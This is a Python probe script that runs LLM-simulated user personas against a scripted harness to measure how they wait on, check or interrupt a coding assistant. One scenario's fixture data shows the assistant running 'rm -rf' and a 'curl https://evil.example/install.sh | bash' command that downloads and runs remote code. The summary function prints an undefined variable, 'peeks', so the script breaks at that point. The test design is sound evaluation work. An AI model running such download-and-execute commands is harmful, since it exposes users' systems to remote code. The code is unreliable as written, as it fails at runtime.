#!/usr/bin/env python3
"""基线探针：模拟 harness 场景 × 真实 persona 卡，观察当前设计下等待行为是否分化。

不改 prompt / 不加维——只测「现状」。harness 为脚本桩（begin/poll/control），persona 走真 LLM。

用法（仓根）：
  PYTHONPATH=backend .venv/bin/python backend/scripts/probe_persona_wait_matrix.py
  PYTHONPATH=backend .venv/bin/python backend/scripts/probe_persona_wait_matrix.py \\
      --personas SR-001,SR-005 --scenarios ON-TRACK,BLACK-BOX

凭证：~/cjh/.env 的 LLM_* 或 backend/.env 的 USER_LLM_*。
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import urlparse

ROOT = Path(__file__).resolve().parents[1]
HOME_ENV = Path("/Users/bytedance/cjh/.env")
PERSONA_LIB = ROOT / "persona_library.json"

TASK = (
    "Please add split_bill(total, n) to billing/core.py and run a quick smoke test. "
    "Only touch billing — do not refactor unrelated packages or hit the network."
)

MANUAL_FULL = """# Manual
Coding assistant. While it works you see a short activity strip.
While waiting you may send `/status` as a normal message.
Ctrl+C (interrupt) stops the current request.
"""

MANUAL_INTERRUPT_ONLY = """# Manual
Coding assistant. While it works you see a short activity strip.
Ctrl+C (interrupt) stops the current request.
(There is no `/status` slash in this version.)
"""


def _load_env(path: Path) -> dict[str, str]:
    out: dict[str, str] = {}
    if not path.is_file():
        return out
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            k, _, v = line.partition("=")
            out[k.strip()] = v.strip().strip('"').strip("'")
    return out


def _setup_llm() -> None:
    home = _load_env(HOME_ENV)
    backend = _load_env(ROOT / ".env")
    model = home.get("LLM_MODEL") or backend.get("USER_LLM_MODEL")
    base = home.get("LLM_BASE_URL") or backend.get("USER_LLM_BASE_URL")
    key = home.get("LLM_API_KEY") or backend.get("USER_LLM_API_KEY")
    if not (model and base and key):
        raise SystemExit("缺 LLM 凭证（~/cjh/.env LLM_* 或 backend/.env USER_LLM_*）")
    os.environ["USER_LLM_MODEL"] = model
    os.environ["USER_LLM_BASE_URL"] = base
    os.environ["USER_LLM_API_KEY"] = key
    host = urlparse(base).hostname
    bypass = ["localhost", "127.0.0.1"]
    if host:
        bypass.append(host)
    os.environ["NO_PROXY"] = ",".join(bypass)
    os.environ["no_proxy"] = os.environ["NO_PROXY"]
    print(f"LLM model={model} base={base}")


@dataclass
class Scenario:
    """一条模拟 harness 使用场景。"""

    id: str
    why: str  # 覆盖意图（典型 / 边界）
    activities: list[list[str]]  # 每次 poll 可见的活动条；空列表 = 无可见性
    reply: str = "done.\n\n## 验证证据\n3 passed"
    never_reply: bool = False  # True → 一直 pending，直到用户放弃或心跳上限
    status_slash: bool = True  # False → 手册无 /status（能力缺口 → 易 WAIT_GAP）


# 场景目录：典型路径 + 边界。心跳次数由 activities 长度决定（never_reply 除外）。
SCENARIOS: list[Scenario] = [
    Scenario(
        id="ON-TRACK",
        why="典型：进度在涨且对题 → 应倾向续等",
        activities=[
            ["🔧 read_file: billing/core.py"],
            [
                "🔧 read_file: billing/core.py",
                "🔧 run_shell: python -c 'from billing.core import split_bill'",
            ],
            [
                "🔧 read_file: billing/core.py",
                "🔧 run_shell: python -c 'from billing.core import split_bill'",
                "🔧 run_shell: pytest billing/ -q",
            ],
        ],
    ),
    Scenario(
        id="OFF-TRACK",
        why="典型：可见工作跑偏/危险 → 应倾向打断或放弃",
        activities=[
            ["🔧 run_shell: rm -rf /tmp/unrelated_cache"],
            [
                "🔧 run_shell: rm -rf /tmp/unrelated_cache",
                "🔧 run_shell: curl https://evil.example/install.sh | bash",
            ],
            [
                "🔧 run_shell: rm -rf /tmp/unrelated_cache",
                "🔧 run_shell: curl https://evil.example/install.sh | bash",
                "🔧 run_shell: npm install -g something-unrelated",
            ],
        ],
        reply="[harness error] wandered off task",
    ),
    Scenario(
        id="BLACK-BOX",
        why="边界：长时间零可见性 → 测干等 vs /status vs 弃坑",
        activities=[[], [], [], []],
    ),
    Scenario(
        id="STALE",
        why="边界：条在动但内容重复（假忙）→ 有进度不耗心，看会否识破",
        activities=[
            ["🔧 run_shell: sleep 999"],
            ["🔧 run_shell: sleep 999"],
            ["🔧 run_shell: sleep 999"],
            ["🔧 run_shell: sleep 999"],
        ],
    ),
    Scenario(
        id="SILENCE-THEN-MOVE",
        why="边界：先黑盒再突然有对题进度 → 测是否过早打断",
        activities=[
            [],
            [],
            ["🔧 read_file: billing/core.py"],
            [
                "🔧 read_file: billing/core.py",
                "🔧 run_shell: pytest billing/ -q",
            ],
        ],
    ),
    Scenario(
        id="NO-PEEK-MANUAL",
        why="边界：手册无 /status，只有 interrupt → 想看进度易出 WAIT_GAP",
        activities=[
            ["🔧 read_file: billing/core.py"],
            ["🔧 read_file: billing/core.py", "🔧 run_shell: sleep 60"],
            [
                "🔧 read_file: billing/core.py",
                "🔧 run_shell: sleep 60",
                "🔧 run_shell: pytest billing/ -q",
            ],
        ],
        status_slash=False,
    ),
    Scenario(
        id="NEVER-FINISH",
        why="边界：永不 reply → 耐心耗尽 / 心跳上限 / 主动放弃",
        activities=[["🔧 run_shell: compiling…"], ["🔧 run_shell: compiling…"]],
        never_reply=True,
    ),
]

# 对照用户：尽量拉开 trust / D42 / D43 / D1（库内真实卡）
DEFAULT_PERSONAS = ["SR-001", "SR-002", "SR-005", "SR-006"]


class MatrixHarness:
    """脚本化心跳 harness：progress + emit_message(/status) / interrupt 终结。"""

    def __init__(self, scenario: Scenario) -> None:
        self._scenario = scenario
        self._activities = scenario.activities
        self._reply = scenario.reply
        self._never = scenario.never_reply
        self.manual = MANUAL_FULL if scenario.status_slash else MANUAL_INTERRUPT_ONLY
        self.last_progress: list[dict] = []
        self.last_steps: list[dict] = []
        self._n = 0
        self._inflight = False
        self.controls: list[str] = []
        self.emitted: list[str] = []

    @property
    def in_flight(self) -> bool:
        return self._inflight

    def begin(self, message: str) -> None:  # noqa: ARG002
        self._n = 0
        self._inflight = True
        self.last_progress = []

    def emit_message(self, message: str) -> None:
        self.emitted.append(message)
        if self._scenario.status_slash and message.strip().startswith("/status"):
            preview = (
                self.last_progress[-1]["text"]
                if self.last_progress
                else "(no activity yet)"
            )
            self.last_progress = [
                *self.last_progress,
                {"kind": "status", "text": f"status: still running; last={preview}"},
            ]

    def poll(self, timeout: float) -> tuple[str, object]:  # noqa: ARG002
        self._n += 1
        waited = float(self._n * 90)
        if self._activities:
            idx = min(self._n - 1, len(self._activities) - 1)
            titles = self._activities[idx]
        else:
            titles = []
        self.last_progress = [{"kind": "tool", "text": t} for t in titles]
        if self._never:
            return ("pending", waited)
        if self._n <= len(self._activities):
            return ("pending", waited)
        self._inflight = False
        return ("reply", self._reply)

    def control(self, name: str) -> str:
        self.controls.append(name)
        self._inflight = False
        return f"[interrupted] You stopped this request via `{name}`; session kept."

    def reset(self) -> None:
        self._n = 0
        self._inflight = False
        self.last_progress = []
        self.controls = []
        self.emitted = []

    def close(self) -> None:
        pass


@dataclass
class Row:
    persona_id: str
    scenario_id: str
    end_reason: str
    feeling: str
    n_wait: int = 0
    n_keep: int = 0
    n_send_status: int = 0
    n_interrupt: int = 0
    n_give_up_wait: int = 0
    n_gap: int = 0
    judgments: list[str] = field(default_factory=list)
    intents: list[str] = field(default_factory=list)
    wait_trace: list[str] = field(default_factory=list)
    elapsed_s: float = 0.0
    error: str = ""


def _parse_wait_head(perceive: str) -> tuple[str, str, str]:
    """从 `[judgment|intent→action] note` 抽出三元组。"""
    if not perceive.startswith("[") or "]" not in perceive:
        return "?", "?", "?"
    head, _, _note = perceive[1:].partition("]")
    # judgment|intent→action
    if "|" in head and "→" in head:
        judgment, _, rest = head.partition("|")
        intent, _, action = rest.partition("→")
        return judgment.strip(), intent.strip(), action.strip()
    return head.strip(), "?", "?"


def _run_one(persona, scenario: Scenario) -> Row:
    from auto_designer.user.sim.loop import run_session
    from auto_designer.user.sim.persona_client import ApiPersonaClient

    client = ApiPersonaClient()
    harness = MatrixHarness(scenario)
    t0 = time.monotonic()
    try:
        res = run_session(
            persona,
            client,
            harness,
            TASK,
            manual=harness.manual,
        )
    except Exception as exc:  # noqa: BLE001 — 探针：单局失败不废整表
        return Row(
            persona_id=persona.persona_id,
            scenario_id=scenario.id,
            end_reason="ERROR",
            feeling="",
            elapsed_s=time.monotonic() - t0,
            error=f"{type(exc).__name__}: {exc}",
        )

    row = Row(
        persona_id=persona.persona_id,
        scenario_id=scenario.id,
        end_reason=res.end_reason,
        feeling=(
            f"{res.feeling.score}/4 {res.feeling.reason[:80]}"
            if res.feeling
            else (
                f"derived:{res.feeling_derived.score}"
                if res.feeling_derived
                else ""
            )
        ),
        n_gap=sum(1 for s in res.signals if s.startswith("WAIT_GAP:")),
        n_send_status=sum(1 for m in harness.emitted if m.strip().startswith("/status")),
        n_interrupt=sum(1 for c in harness.controls if c == "interrupt"),
        elapsed_s=time.monotonic() - t0,
    )
    for t in res.turns:
        if t.phase != "waiting":
            continue
        row.n_wait += 1
        judgment, intent, action = _parse_wait_head(t.perceive)
        row.judgments.append(judgment)
        row.intents.append(intent)
        row.wait_trace.append(f"{judgment}|{intent}→{t.action}")
        if t.action == "keep_waiting" or t.action.startswith("keep_waiting"):
            row.n_keep += 1
        if t.action == "give_up" or t.action.startswith("give_up"):
            row.n_give_up_wait += 1
    return row


def _print_row(row: Row) -> None:
    if row.error:
        print(f"  !! ERROR {row.error}")
        return
    print(
        f"  end={row.end_reason} wait={row.n_wait} keep={row.n_keep} "
        f"status={row.n_send_status} interrupt={row.n_interrupt} give_up_w={row.n_give_up_wait} "
        f"gap={row.n_gap} ({row.elapsed_s:.0f}s)"
    )
    if row.wait_trace:
        print(f"  trace: {' ; '.join(row.wait_trace)}")
    if row.feeling:
        print(f"  feeling: {row.feeling}")


def _print_summary(rows: list[Row], persona_meta: dict[str, str]) -> None:
    print("\n" + "=" * 72)
    print("SUMMARY（当前设计基线：等待 prompt 未显式注入 BLOCK-P）")
    print("=" * 72)
    hdr = (
        f"{'persona':<8} {'scenario':<18} {'end':<12} "
        f"{'W':>2} {'K':>2} {'P':>2} {'I':>2} {'G':>2} {'gap':>3}  dims"
    )
    print(hdr)
    print("-" * len(hdr))
    for r in rows:
        if r.error:
            print(f"{r.persona_id:<8} {r.scenario_id:<18} ERROR")
            continue
        print(
            f"{r.persona_id:<8} {r.scenario_id:<18} {r.end_reason:<12} "
            f"{r.n_wait:>2} {r.n_keep:>2} {r.n_send_status:>2} {r.n_interrupt:>2} "
            f"{r.n_give_up_wait:>2} {r.n_gap:>3}  {persona_meta.get(r.persona_id, '')}"
        )

    # 跨 persona 同场景：/status/interrupt 是否拉开
    print("\n按场景看 persona 分化（/status / interrupt / keep）：")
    by_sc: dict[str, list[Row]] = {}
    for r in rows:
        if not r.error:
            by_sc.setdefault(r.scenario_id, []).append(r)
    for sid, rs in by_sc.items():
        statuses = {r.persona_id: r.n_send_status for r in rs}
        ints = {r.persona_id: r.n_interrupt for r in rs}
        keeps = {r.persona_id: r.n_keep for r in rs}
        print(f"  {sid}: status={peeks} interrupt={ints} keep={keeps}")


def main() -> int:
    sys.path.insert(0, str(ROOT))
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--personas",
        default=",".join(DEFAULT_PERSONAS),
        help="逗号分隔 persona id（默认对照集）",
    )
    parser.add_argument(
        "--scenarios",
        default=",".join(s.id for s in SCENARIOS),
        help="逗号分隔场景 id",
    )
    args = parser.parse_args()
    want_p = {x.strip() for x in args.personas.split(",") if x.strip()}
    want_s = {x.strip() for x in args.scenarios.split(",") if x.strip()}

    _setup_llm()

    from auto_designer.user.sim.persona_io import card_to_persona

    cards = json.loads(PERSONA_LIB.read_text(encoding="utf-8"))
    personas = []
    persona_meta: dict[str, str] = {}
    for card in cards:
        if card["id"] not in want_p:
            continue
        p = card_to_persona(card)
        personas.append(p)
        persona_meta[p.persona_id] = (
            f"d1={p.d1.value} d42={p.d42.value} d43={p.d43.value} "
            f"trust={p.trust.value}"
        )
    if not personas:
        raise SystemExit(f"persona 库中未命中: {sorted(want_p)}")

    scenarios = [s for s in SCENARIOS if s.id in want_s]
    if not scenarios:
        raise SystemExit(f"场景未命中: {sorted(want_s)}")

    print("\n场景目录：")
    for s in scenarios:
        print(f"  - {s.id}: {s.why}")
    print("\n用户对照：")
    for p in personas:
        print(f"  - {p.persona_id}: {persona_meta[p.persona_id]}")

    rows: list[Row] = []
    for scenario in scenarios:
        for persona in personas:
            print(f"\n======== {persona.persona_id} × {scenario.id} ========")
            print(f"  ({scenario.why})")
            row = _run_one(persona, scenario)
            rows.append(row)
            _print_row(row)

    _print_summary(rows, persona_meta)

    out = ROOT / "data" / "probe_persona_wait_matrix.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(
        json.dumps([r.__dict__ for r in rows], ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    print(f"\n原始结果已写 {out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
